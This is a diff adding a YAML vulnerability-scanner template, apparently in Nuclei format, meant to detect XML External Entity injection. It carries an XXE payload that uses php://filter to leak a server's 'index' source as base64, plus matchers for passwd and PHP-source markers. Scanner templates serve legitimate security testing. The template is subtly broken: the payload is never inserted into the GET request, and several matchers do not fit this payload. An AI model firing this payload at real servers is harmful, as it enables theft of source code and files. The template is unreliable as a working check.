@@ -1,0 +1,25 @@
+id: xxe5-0974
+name: 'XXE read in value'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via value'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      value:
+        - '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index">]><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
